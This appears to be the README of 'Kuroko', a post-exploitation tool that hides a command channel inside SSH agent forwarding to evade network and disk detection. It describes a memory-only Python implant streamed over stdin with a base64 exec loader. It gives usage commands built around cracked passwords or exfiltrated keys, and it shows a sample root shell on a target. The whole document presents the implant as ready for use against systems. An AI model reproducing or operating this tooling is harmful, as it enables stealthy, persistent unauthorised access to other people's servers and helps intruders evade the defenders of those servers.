# Kuroko: SSH Agent-Forwarding Covert Channel

**Kuroko** is a post-exploitation tool that establishes a covert communication channel by multiplexing data over an existing SSH connection.

Rather than relying on traditional network sockets (TCP/UDP) which create new, detectable connection flows, Kuroko repurposes the **SSH Agent Forwarding** protocol (`auth-agent@openssh.com`). It injects a Python runtime payload into memory that piggybacks on the existing encrypted session to transport arbitrary data, effectively turning the `SSH_AUTH_SOCK` into a general-purpose, bidirectional pipe.

## The Technical "Cool Factor": RFC Abstraction Abuse

The core innovation of Kuroko is the abuse of the SSH Transport Layer Protocol (RFC 4254).

### 1. The Channel Multiplexing

In a standard SSH connection, the "session" is actually a multiplexer. It carries multiple logical channels (Shell, SFTP, Port Forwarding) over a single TCP connection.

* **Normal Usage:** When `ForwardAgent yes` is enabled, the SSH Daemon creates a listener on the remote host (a UNIX Domain Socket). When a process connects to this socket, the daemon opens a new specific channel type (`auth-agent@openssh.com`) to the client.
* **The Kuroko Exploit:** The SSH Daemon **does not inspect the payload** of this channel. It acts purely as a transport proxy. Kuroko exploits this opacity. We tell the server "I want to do agent forwarding," but instead of connecting the channel to a local RSA key agent, we attach a custom Python handler.

### 2. UNIX Domain Socket Hijacking

On the remote target, Kuroko does not open a TCP port (avoiding `netstat` detection for ESTABLISHED internet connections). Instead, it connects to the local filesystem socket located at `os.environ['SSH_AUTH_SOCK']`.
To the operating system, this looks like a local process talking to a local daemon. To the network firewall, it looks like a single packet stream on Port 22.

## How It Works Under the Hood

### Phase 1: The Protocol-Level Hijack

Kuroko uses `Paramiko` to interface with the SSH Transport layer directly.

1. **Request:** The client sends an `SSH_MSG_CHANNEL_REQUEST` with `request type="auth-agent-req@openssh.com"`.
2. **Callback Hook:** Paramiko allows us to define a callback function for when this specific channel type is opened. Kuroko registers the `covert_loop` function here.
3. **Result:** When the remote implant connects to the socket, the SSH daemon's "forwarding" logic triggers our custom function instead of the OS's real SSH agent.

### Phase 2: Stdin Process Injection

To maintain a zero-footprint on the disk, Kuroko avoids uploading files (`scp`/`sftp`).

1. **Execution:** It invokes a raw `python3` process with **no arguments**. This appears in process listings (`ps aux`) as a benign, idle interpreter:
```bash
user     1337  0.0  0.1  1000  2000 ?        Ss   10:00   0:00 python3

```


2. **Payload Streaming:** The full staging code is Base64 encoded and written directly to the process's `stdin` file descriptor (fd 0).
3. **Bootstrap:** A tiny loader (`exec(base64.b64decode(sys.stdin.read()))`) reads the stream until EOF, compiles it in memory, and executes it.

### Phase 3: The Covert Loop

Once established, the architecture resembles a classic Client-Server model, but the "Network" layer is abstracted away by the SSH Tunnel:

* **Encapsulation:** Command JSON  Length Header (4 bytes)  SSH Channel Data Packet  TCP (Port 22).
* **Persistence:** The Python process utilizes `os.chdir` and `os.environ` to maintain state (current directory, variables) between commands, persisting context without creating new shell processes.

## Architecture Diagram

```mermaid
graph TD
    subgraph Local_Machine [Attacker Machine]
        Kuroko[Kuroko Client]
        Paramiko[Paramiko Transport]
    end

    subgraph SSH_Tunnel [Encrypted SSH Session (TCP :22)]
        Channel[Channel: auth-agent@openssh.com]
    end

    subgraph Remote_Target [Target Server]
        SSHD[SSH Daemon]
        Socket[Unix Socket: /tmp/ssh-XXXX/agent.sock]
        Implant[Python3 Process (Memory Only)]
    end

    %% Flow
    Kuroko --"1. Request Agent Fwd"--> Paramiko
    Paramiko --"2. SSH Packet"--> SSHD
    SSHD --"3. Creates"--> Socket
    
    Kuroko --"4. Inject Payload (stdin)"--> Implant
    Implant --"5. Connect()"--> Socket
    
    Socket --"6. Raw Bytes"--> SSHD
    SSHD --"7. Multiplexed Stream"--> Channel
    Channel --"8. Decapsulated Data"--> Kuroko

```

## How to Use

### Prerequisites

Kuroko requires Python 3 and the `paramiko` library on the attacker's machine. The target only requires a standard `python3` installation.

```bash
pip install paramiko

```

### Basic Syntax

```bash
python3 kuroko.py <TARGET_IP> -u <USERNAME> [AUTH_METHOD]

```

### Examples

**1. Password Authentication**
Connect using a standard password. This is useful for lateral movement when you have cracked credentials.

```bash
python3 kuroko.py 192.168.1.100 -u kali -p s3cr3t

```

**2. SSH Key Authentication**
Connect using a private key file (PEM/OpenSSH format). This is ideal for persistence if you have exfiltrated a key or added your own public key to `~/.ssh/authorized_keys`.

```bash
python3 kuroko.py 192.168.1.100 -u root -k ~/.ssh/id_rsa

```

### Interactive Shell

Once connected, you will drop into a pseudo-shell. The prompt dynamically updates with the current user and directory context.

```text
[*] Connecting to 192.168.1.100...
[*] Injecting stager via STDIN (Covert Mode)...
[*] Stager injected.
[*] Socket connection received
[*] Sending payload...
[+] Target confirmed: [+] Implant loaded.
------------------------------------------------------------
Remote Shell> whoami
root

root:/var/www/html Shell> cd /tmp
(Command executed with no output)

root:/tmp Shell> ls -la
total 4
drwxrwxrwt  2 root root 4096 Jan 05 16:20 .
drwxr-xr-x 20 root root 4096 Jan 01 00:00 ..

```